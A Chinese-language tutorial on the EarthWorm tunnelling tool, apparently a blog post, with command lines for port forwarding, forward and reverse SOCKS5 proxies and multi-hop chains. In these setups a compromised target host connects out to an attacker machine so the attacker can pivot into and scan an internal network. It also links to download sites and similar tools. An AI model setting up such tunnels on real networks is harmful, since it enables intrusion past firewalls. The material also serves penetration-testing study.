> 一句话说明：复杂内网下，数据转发，转出转入工具；常用于socks5代理，深度扫描内网；
>
> 官方：EarthWorm是一款用于开启 SOCKS v5 代理服务的工具，基于标准 C 开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。

## 零、前言

本文是在学习了下面参考文章的基础上，基于自己的理解和心得补充了数据流量拓扑图，这样更好理解工具的使用场景和记住命令；本文仅作为技术交流。

## 一、要点先说

1.ew 自身的各个选项用途说明

    
    
    -l 指定要监听的本地端口
    -d 指定要反弹到的机器 ip
    -e 指定要反弹到的机器端口
    -f 指定要主动连接的机器 ip
    -g 指定要主动连接的机器端口
    -t 指定超时时长,默认为 1000
    

2.正向代理和反向代理用途的区别

    
    
    正向代理的典型用途是为在防火墙内的局域网客户端提供访问Internet的途径。
    反向代理的典型用途是将防火墙后面的服务器提供给Internet用户访问。
    

3.rssocks 启动的socks5服务，转发到最后一步必须使用rcsocks接收

4.工具下载地址

http://rootkiter.com/EarthWorm/supportlist/

Program Name| Describe| Eg  
---|---|---  
[ew_for_Win.exe](http://rootkiter.com/download/ew/ew_for_Win.exe)|
适用各种Windows系统(X86指令集、X64指令集)| Windows7、Windows XP  
[ew_for_Linux32](http://rootkiter.com/download/ew/ew_for_Linux32)| 各常见Linux发行版
(X86 指令集 CPU)| Ubuntu(X86)/BT5(X86)  
[ew_for_linux64](http://rootkiter.com/download/ew/ew_for_linux64)| 各常见Linux发行版
(X64 指令集 CPU)| Ubuntu(X64)/Kali(X64)  
[ew_for_MacOSX64](http://rootkiter.com/download/ew/ew_for_MacOSX64)|
MacOS系统发行版 (X64 指令集)| 苹果PC电脑，苹果server  
[ew_for_Arm32](http://rootkiter.com/download/ew/ew_for_Arm32)| 常见Arm-Linux系统|
HTC New One(Arm-Android)/小米路由器(R1D)  
[ew_mipsel](http://rootkiter.com/download/ew/ew_mipsel)| 常见Mips-Linux系统
(Mipsel指令集 CPU)| 萤石硬盘录像机、小米mini路由器(R1CM)  
  
## 二、端口转发功能

### 场景一

在攻击机运行工具，主动连接靶机3389端口，并将靶机的3389映射到攻击机本地1080端口；达到在攻击机侧访问本地1080端口，将数据转发到靶机3389；

    
    
    ./ew -s lcx_tran -l 1080 -f 114.114.114.114 -g 3389
    

![image](https://image.3001.net/images/20210511/1620720274_609a3a9244d9b6d414121.png!small)

### 场景二

攻击机侧运行工具，做1080端口转发本地8080端口，且8080端口接受外部连接；靶机将本地3389端口数据转发到攻击机8080端口；  
最终形成一条由靶机主动外联攻击机，并在靶机与攻击机形成一条数据转发通道：攻击机1080<\--------->3389靶机

    
    
    第一步：./ew -s lcx_listen -l 1080 -e 8080
    第二步：./ew -s lcx_slave -d 114.114.114.114 -e 8080 -f 10.0.0.1 -g 3389
    

![image](https://image.3001.net/images/20210511/1620720306_609a3ab2903280375b354.png!small)

## 三、socks5代理功能

### 场景一(正向代理)

在靶机侧运行工具监听1080端口对外提供socks5代理服务；在攻击机侧使用代理工具(例如：proxychains)连接靶机提供的socks5代理服务，继续渗透扫描内网。

    
    
    ./ew -s ssocksd -l 1080
    

![image](https://image.3001.net/images/20210511/1620720341_609a3ad5d4dc6fb9198aa.png!small)

### 场景二(反向代理)

靶机侧运行工具，本地启动socks5服务，主动外联攻击机8080端口，攻击机侧运行工具，将对外访问的8080端口与到本地1080端口做映射，进行数据转发；

    
    
    第一步：./ew -s rcsocks -l 1080 -e 8080
    第二步：./ew -s rssocks -d 114.114.114.114 -e 8080
    

![image](https://image.3001.net/images/20210511/1620720413_609a3b1d9ae8556ce69b2.png!small)

### 场景三(正向代理)：

靶机侧运行工具启动socks5服务，边缘机侧运行工具将本地从1080端口收到的数据全部转发到靶机1086端口，在攻击机侧使用代理工具(例如：proxychains)连接边缘机提供的1080端口；最终达到攻击机侧与靶机之间形成socks5代理通道，继续渗透扫描内网。

    
    
    第一步：./ew -s ssocksd -l 1086
    第二步：./ew  -s lcx_tran -l 1080 -f 10.0.0.2 -g 1086
    

![image](https://image.3001.net/images/20210511/1620720434_609a3b321d80b5c6bebf7.png!small)

### 场景四(反向代理)：

靶机侧运行工具启动socks5服务，边缘机侧运行工具连接靶机1086端口并主动外联攻击机8080端口；攻击机侧运行工具，对外监听8080端口，并将数据转发到本地1080端口；最终实现在攻击机侧1080端口<\--->靶机之间形成一条代理通道；

    
    
    第一步：./ew -s ssocksd -l 1086
    第二步：./ew -s lcx_listen -l 1080 -e 8080
    第三步：./ew -s lcx_slave -d 114.114.114.114 -e 8080 -f 10.0.0.2 -g 1086
    

![image](https://image.3001.net/images/20210511/1620720453_609a3b457de11c9d43433.png!small)

### 场景五(反向代理)-复杂型多级联接

靶机侧运行工具本地启动socks5服务并反向连接中间机7777端口；中间机侧运行工具将9999端口与7777端口数据转发互通；边缘机侧运行工具，通过主动外联攻击机8080端口将数据转发到中间机9999端口；攻击机侧运行工具，对外监听8080端口，并将数据转发到本地1080端口；最终实现在攻击机侧1080端口<\--->靶机之间形成一条代理通道；

    
    
    第一步：./ew -s lcx_listen -l 9999 -e 7777
    第二步：./ew -s rssocks -d 10.0.1.2 -e 7777
    第三步：./ew -s rcsocks -l 1080 -e 8080
    第四步：./ew -s lcx_slave -d 114.114.114.114 -e 8080 -f 10.0.0.2 -g 9999
    

![image](https://image.3001.net/images/20210528/1622207179_60b0eacbbad98612e3a16.png!small)

## 四、最后说点什么

1.耐下心来

刚开始看到这个工具本想一看而过，后来耐心的学习一下，打开了新世界。

2.动手实践

看了很多文章也包括官方的文档；发现对小白来说想了解工具功能和不同场景，单看文字不直观，没有网络拓扑很难理解。所以本着自己边学习边记录边分享的精神，整理了这篇文章。

3.横向比较

3.1还发现了这个作者的另一个好用的工具Termite；目前EW和Termite作者已经不维护了；工具下载方式如下：

    
    
    #git clone https://github.com/rootkiter/Binary-files.git
    #cd Binary-files
    #git checkout bd32230
    HEAD 目前位于 bd32230 fix ew version
    #ls
    EarthWorm README.md Termite
    

其中Termite文件夹下面就是工具；

3.2然后我在学习Termite的过程中又找到了一个和Termite功能基本一致的工具Venom(地址：https://github.com/Dliv3/Venom)，我可以说这两个工具对我来说可以算是“神器”了！因为本篇重点是介绍EW的使用方法，后面再根据情况，也记录一下这两个“神器”工具的使用；

感兴趣的小伙伴可以学习一下Termite/Venom，玩起来挺爽；

## 参考文章：

### 0.项目主页

http://rootkiter.com/EarthWorm/

### 1.内网穿透的n种姿势

https://xz.aliyun.com/t/9454?accounttraceid=69827aec0fbd4da68045e255cee9fd32xlwo

### 2.EW使用

https://blog.csdn.net/ws13129/article/details/94445378

### 3.内网渗透入门到放弃之必备杀器

https://www.shangyouw.cn/win7/arc36509.html

### 4.Termite官方介绍说明

http://rootkiter.com/Termite/

http://rootkiter.com/Termite/README.txt

https://github.com/rootkiter/Termite

### 5.Venom官方介绍说明

https://github.com/Dliv3/Venom

